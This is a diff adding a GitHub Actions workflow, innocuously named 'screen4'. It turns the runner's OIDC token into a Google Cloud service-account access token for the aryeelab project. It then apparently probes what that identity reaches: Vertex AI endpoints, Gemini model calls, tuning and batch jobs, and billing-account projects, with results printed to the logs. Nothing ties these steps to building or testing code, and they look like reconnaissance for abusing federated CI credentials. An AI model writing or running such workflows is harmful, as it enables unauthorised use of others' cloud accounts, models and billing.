@@ -1,0 +1,69 @@
+name: screen4
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  screen4:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - name: screen4
+        run: |
+          set +e
+          PRJ='projects/303574531351/locations/global/workloadIdentityPools/github-actions-pool/providers/github-provider'
+          jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
+          for a in 1 2 3; do
+            J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://iam.googleapis.com/$PRJ")
+            echo "$J" | jq -r '.value // empty' > tok.jwt
+            [ -s tok.jwt ] && break
+            sleep 3
+          done
+          curl -s -o r.json -w 'STS=%{http_code}\n' -X POST https://sts.googleapis.com/v1/token \
+            -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+            --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
+            --data-urlencode "subject_token=$(cat tok.jwt)" \
+            -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+            -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+            -d "scope=https://www.googleapis.com/auth/cloud-platform"
+          FT=$(jq -r '.access_token // empty' r.json)
+          AT=$(curl -s -X POST -H "Authorization: Bearer $FT" -H "Content-Type: application/json" \
+            "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/github-actions@aryeelab.iam.gserviceaccount.com:generateAccessToken" -d @req.json | jq -r '.accessToken // empty')
+          echo "##ATLEN ${#AT}"
+          [ -z "$AT" ] && { echo '##ABORT'; exit 0; }
+          jq -n '{contents:[{role:"user",parts:[{text:"Say OK"}]}],generationConfig:{maxOutputTokens:8}}' > gc.json
+
+          echo "##PHASE locations"
+          for U in https://aiplatform.googleapis.com https://us-central1-aiplatform.googleapis.com; do
+            c=$(curl -s -o loc.json -w '%{http_code}' -H "Authorization: Bearer $AT" "$U/v1/projects/aryeelab/locations")
+            echo "##LOC u=$U code=$c n=$(jq -r '(.locations // []) | length' loc.json 2>/dev/null) names=$(jq -r '[.locations[]?.locationId // .locations[]?.name // ""] | join(",")' loc.json 2>/dev/null | head -c 300)"
+          done
+
+          echo "##PHASE endpoints"
+          for R in us-central1 europe-west1 global; do
+            if [ "$R" = "global" ]; then U="https://aiplatform.googleapis.com"; else U="https://$R-aiplatform.googleapis.com"; fi
+            c=$(curl -s -o ep.json -w '%{http_code}' -H "Authorization: Bearer $AT" "$U/v1/projects/aryeelab/locations/$R/endpoints")
+            echo "##ENDPOINTS r=$R code=$c n=$(jq -r '(.endpoints // []) | length' ep.json 2>/dev/null) body=$(head -c 200 ep.json | tr -d '\n' | tr -s ' ')"
+          done
+
+          echo "##PHASE gencontent"
+          for M in gemini-2.5-flash gemini-2.5-pro gemini-2.0-flash-001 gemini-flash-latest gemini-1.5-flash-002; do
+            for R in us-central1 global; do
+              if [ "$R" = "global" ]; then U="https://aiplatform.googleapis.com"; else U="https://$R-aiplatform.googleapis.com"; fi
+              g=$(curl -s -o g_${M}_${R}.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" "$U/v1/projects/aryeelab/locations/$R/publishers/google/models/$M:generateContent" -d @gc.json)
+              echo "##GC m=$M r=$R code=$g body=$(head -c 220 g_${M}_${R}.json | tr -d '\n' | tr -s ' ')"
+            done
+          done
+
+          echo "##PHASE tuning"
+          c=$(curl -s -o tj.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://us-central1-aiplatform.googleapis.com/v1/projects/aryeelab/locations/us-central1/tuningJobs")
+          echo "##TUNING code=$c body=$(head -c 200 tj.json | tr -d '\n' | tr -s ' ')"
+          c=$(curl -s -o bp.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://us-central1-aiplatform.googleapis.com/v1/projects/aryeelab/locations/us-central1/batchPredictionJobs")
+          echo "##BATCH code=$c body=$(head -c 200 bp.json | tr -d '\n' | tr -s ' ')"
+
+          echo "##PHASE billing_acct"
+          c=$(curl -s -o ba2.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://cloudbilling.googleapis.com/v1/billingAccounts/01AE22-59EB44-3A4134/projects")
+          echo "##BA_PROJECTS code=$c body=$(head -c 400 ba2.json | tr -d '\n' | tr -s ' ')"
+          echo "##FINISHED"
+
